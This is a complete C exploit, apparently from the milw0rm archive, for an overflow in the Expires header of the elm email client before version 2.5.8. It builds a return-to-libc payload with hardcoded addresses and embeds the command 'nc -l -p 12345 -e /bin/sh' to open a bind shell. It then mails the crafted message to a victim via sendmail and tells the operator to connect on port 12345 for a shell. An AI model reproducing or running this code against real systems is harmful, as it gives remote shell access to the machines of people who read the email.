/*

  Exploit code for the bug posted by Ulf Harnhammar (metaurtelia.com)
  http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0688.html

  Probably you will need to change SYSLOC and STRLOC to work on your box

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFFER 83
#define EMAIL  "tmpmail"
#define STRING "`nc -l -p 12345 -e /bin/sh`&##"
#define SYSLOC 0x42041e50
#define STRLOC 0x4001a207
#define EXTLOC 0x4202b0f0

char expire[]="\x45\x78\x70\x69\x72\x65\x73\x3A\x20";

int main(int argc, char **argv)
{
      char buffer[BUFFER];
      char *email = NULL;
      char *user = NULL;
      int i;
      long extloc, sysloc, strloc;
      FILE *fp;

      if(argc != 2) {
        puts("Usage: ./elmex <user@where.com>");
        exit(EXIT_FAILURE);
      }

      if(strlen(argv[1]) > 50) {
              puts("[-] Sorry, email address too long!");
              exit(EXIT_FAILURE);
      }

      user = (char *)malloc(strlen(argv[1]));
      if(!user) {
              perror("malloc");
              exit(EXIT_FAILURE);
      }

      email = EMAIL;

      memset(user, '\0', strlen(argv[1]));
      memcpy(user, argv[1], strlen(argv[1]));

      puts("\nExploit for elm email client < 2.5.8 overflow in Expires field");
      puts("Tested: Redhat on quiet a Sunday by c0ntex[at]open-security.org\n");

      extloc = EXTLOC;
      sysloc = SYSLOC;
      strloc = STRLOC;

      memset(buffer, '\0', BUFFER);
      memcpy(buffer, expire, strlen(expire));

      for(i = strlen(expire); i < 53; i++)
              *(buffer+i) = 0x41;
      for(i = 53; i < 57; i += 4)
              *(long *)&buffer[i] = sysloc;
      for(i = 57; i < 61; i++)
              *(long *)&buffer[i] = extloc;
      for(i = 61; i < 65; i += 4)
              *(long *)&buffer[i] = strloc;

      memcpy(&buffer[65], STRING, strlen(STRING));
      buffer[BUFFER] = '\0';

      puts("[-] Adding exploit buffer to email");

      fp = fopen(email, "w");
      if(!fp) {
              perror("fopen"); free(user);
              exit(EXIT_FAILURE);
      }

      fprintf(fp,
               "From: User c0ntex <c0ntex@open-security.org> Sun Aug 21 13:37:00 2005\n"
               "Return-Path: <c0ntex@localhost\n"
               "Date: Sun, 21 Aug 2005 13:37:00 %s\n"
               "Subject: Insecure?\n"
               "To: %s\n"
               "%s\n", STRING, user, buffer);
      fclose(fp);

      printf("[-] Emailing %s with malicious content\n", argv[1]);

      if(system("/bin/cat ./tmpmail | /usr/sbin/sendmail -t") <0) {
              perror("system");  free(user);
              exit(EXIT_FAILURE);
      }

      puts("[-] Connect to system on port 12345 to get your shell\n");

      if(unlink(EMAIL) <0)
              perror("unlink");

      free(user);

      return EXIT_SUCCESS;
}

// milw0rm.com [2005-08-22]
